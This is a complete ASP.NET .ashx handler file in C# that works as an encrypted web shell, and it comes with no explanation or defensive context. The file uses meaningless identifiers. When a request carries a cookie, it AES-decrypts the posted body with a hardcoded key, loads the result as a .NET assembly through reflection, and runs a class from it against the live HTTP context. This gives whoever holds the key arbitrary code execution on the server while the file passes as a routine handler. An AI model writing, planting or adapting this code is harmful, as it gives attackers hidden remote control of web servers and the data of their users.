<%@ WebHandler Language="C#" Class="H_4f1a" %>
using System;using System.Web;using System.Reflection;using System.IO;
public class H_4f1a:IHttpHandler{
    private byte[] d_a9(byte[] i_b1, byte[] k_c2){var m_d3=new System.Security.Cryptography.RijndaelManaged();var d_e4=m_d3.CreateDecryptor(k_c2,k_c2);return d_e4.TransformFinalBlock(i_b1,0,i_b1.Length);}
    private object e_f5(byte[] p_g6){var m_h7=typeof(Assembly);var mi_i8=m_h7.GetMethod("Load",new Type[]{typeof(byte[])});return mi_i8.Invoke(null,new object[]{p_g6});}
    public void ProcessRequest(HttpContext c_j9){
        if(c_j9.Request.Cookies.Count>0){
            byte[] k_k0=new byte[]{99,97,54,51,52,53,55,53,51,56,98,57,98,49,101,48};
            byte[] b_l1=new byte[c_j9.Request.InputStream.Length];c_j9.Request.InputStream.Read(b_l1,0,b_l1.Length);
            Assembly a_m2=(Assembly)e_f5(d_a9(b_l1,k_k0));
            string n_n3=System.Text.Encoding.UTF8.GetString(new byte[]{75});
            a_m2.CreateInstance(n_n3).Equals(c_j9);
        }
    }
    public bool IsReusable{get{return false;}}
}